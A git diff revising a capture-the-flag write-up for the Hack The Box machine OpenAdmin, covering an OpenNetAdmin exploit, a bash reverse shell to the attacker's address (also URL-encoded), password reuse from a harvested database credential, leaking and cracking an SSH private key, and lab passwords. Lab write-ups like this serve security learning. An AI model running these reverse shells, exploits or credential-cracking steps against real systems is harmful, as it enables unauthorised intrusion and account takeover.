@@ -83,12 +83,11 @@ Let's check the found directories and start with `/music`.
 
 > http://10.10.10.171/music
 
-After clicking on `login` we are getting redirected.
+When we click on `login` we are getting redirected.
 
 > http://10.10.10.171/ona/
 
-If we use google to check for an alrady available exploit, we will find the
-following one on exploit-db.
+By using google we find an available exploit on exploit-db.
 
 > https://www.exploit-db.com/exploits/47691
 
@@ -118,7 +117,7 @@ while true;do
 done
 ```
 
-At first we download the raw exploit.
+Let's download the raw exploit.
 
 ```console
 $ wget https://www.exploit-db.com/raw/47691
@@ -158,8 +157,8 @@ $ bash -c 'bash -i >& /dev/tcp/<local_ip>/<local_port> 0>&1'
 %62%61%73%68%20%2d%63%20%27%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%30%2e%31%30%2e%31%34%2e%33%2f%39%30%30%31%20%30%3e%26%31%27
 ```
 
-At this point we have to start a netcat listener on our desired port, then enter
-the url encoded string to our shell to get the reverse shell.
+Now we have to start a netcat listener on our desired port, then enter the url encoded 
+string to our shell to get the reverse shell.
 
 ```bash
 $ nc -lnvp 9001
@@ -178,8 +177,8 @@ www-data@openadmin:/opt/ona/www$ python3 -c 'import pty;pty.spawn("/bin/bash")'
 $ python3 -c 'import pty;pty.spawn("/bin/bash")'
 ```
 
-This was the first part. For the next part you have to exactly enter the following
-inputs, otherwise you will break your shell.
+This was the first part. For the next part we have to exactly enter the following
+inputs, otherwise we will break your shell.
 
 ```console
 Ctrl + z
@@ -190,7 +189,7 @@ Enter
 export XTERM=xterm
 ```
 
-If you entered everything correctly, you will get a full working shell on the box.
+If you ente everything correctly, you will get a full working shell on the box.
 
 ```console
 www-data@openadmin:/opt/ona/www$ ^Z
@@ -212,7 +211,71 @@ Please notice that this only works with bash. If you are using zsh you may ran i
 
 ## Enumeration
 
-At first we start with some basic manually enumeration on the `/var/www/html/ona/` directory.
+At first we start with some basic manually enumeration on the `/var/www/` directory to see what
+we get.
+
+```bash
+www-data@openadmin:/var/www$ ls -la
+ls -la
+total 16
+drwxr-xr-x  4 root     root     4096 Nov 22  2019 .
+drwxr-xr-x 14 root     root     4096 Nov 21  2019 ..
+drwxr-xr-x  6 www-data www-data 4096 Nov 22  2019 html
+drwxrwx---  2 jimmy    internal 4096 Nov 23  2019 internal
+lrwxrwxrwx  1 www-data www-data   12 Nov 21  2019 ona -> /opt/ona/www
+```
+
+We notice that we have only access to html and to the directory we are landed after the footholding.
+Furhter we have to privilege escalate to jimmy, to get access to the internal directory.
+
+Let's check who else have an account on this box.
+
+```bash
+www-data@openadmin:/var/www$ cat /etc/passwd
+cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+lxd:x:105:65534::/var/lib/lxd/:/bin/false
+uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:109:1::/var/cache/pollinate:/bin/false
+sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
+jimmy:x:1000:1000:jimmy:/home/jimmy:/bin/bash
+mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
+joanna:x:1001:1001:,,,:/home/joanna:/bin/bash
+```
+
+So we have another user. Let's take that to our nodes.
+
+```bash
+User: jimmy
+User: joanna
+```
+
+Now we check out what we find inside the ona directory we can access and have a
+closer look to the `database_settings.inc.php` file.
 
 ```bash
 www-data@openadmin:/var/www/html/ona/local/config$  ls
@@ -243,22 +306,26 @@ $ona_contexts=array (
 ?>
 ```
 
+And we are lucky to get credentials for the mysql database.
+
+```bash
+User: ona_sys
+Password: n1nj4W4rri0R!
+```
+
+Let's see if the password got reused by any of the known accounts.
+
 ```bash
 www-data@openadmin:/var/www/html/ona/local/config$ su - jimmy
 Password: 
 jimmy@openadmin:~$
 ```
 
-```bash
-jimmy@openadmin:/var/www$ ls -la
-total 16
-drwxr-xr-x  4 root     root     4096 Nov 22  2019 .
-drwxr-xr-x 14 root     root     4096 Nov 21  2019 ..
-drwxr-xr-x  6 www-data www-data 4096 Nov 22  2019 html
-drwxrwx---  2 jimmy    internal 4096 Nov 23  2019 internal
-lrwxrwxrwx  1 www-data www-data   12 Nov 21  2019 ona -> /opt/ona/www
-```
+Bingo! Now that we are successfully escalated to jimmy, let's check out the
+internal directory.
 
+In the `main.php` file we get a hint that the file runs on an webserver and
+is able to cat out the ssh private key of joanna.
 
 ```bash
 jimmy@openadmin:/var/www/internal$ cat main.php 
@@ -274,6 +341,8 @@ Click here to logout <a href="logout.php" tite = "Logout">Session
 </html>
 ```
 
+In our nmap we couldn't find any other port or webserver so let's see if there is something
+listening on `127.0.0.1` aka the localhost.
 
 ```bash
 jimmy@openadmin:~$ ss -tulpn
@@ -286,6 +355,9 @@ tcp    LISTEN   0        128               0.0.0.0:22             0.0.0.0:*
 tcp    LISTEN   0        128                     *:80                   *:*
 tcp    LISTEN   0        128                  [::]:22                [::]:*
 ```
+
+The interesting port here is the high port `52846` which we immediately throw a curl at
+to see if we can get the private key.
 
 ```bash
 jimmy@openadmin:/var/www$ curl 127.0.0.1:52846/main.php
@@ -325,10 +397,14 @@ Click here to logout <a href="logout.php" tite = "Logout">Session
 </html>
 ```
 
+Perfect! Now we save the key in a file on our local system and use john to convert it
+into a readable format which we can crack.
+
 ```console
 $ sudo /usr/share/john/ssh2john.py joanna_id_rsa > joanna_id_rsa_hash
 ```
 
+With this done, it's time to crack the key.
 
 ```console
 $ sudo john joanna_id_rsa_hash --wordlist=/usr/share/wordlists/rockyou.txt
@@ -345,11 +421,19 @@ bloodninjas      (joanna_id_rsa)
 Session completed
 ```
 
+Awesome! We get the password.
+
+```bash
+Password: bloodninjas
+```
+
+change the file permission on the key - like always.
 
 ```console
 $ chmod 600 joanna_id_rsa
 ```
 
+And login as joanna to grab the user flag.
 
 ```console
 $ kali@kali:~/Downloads$ ssh -i joanna_id_rsa joanna@10.10.10.171
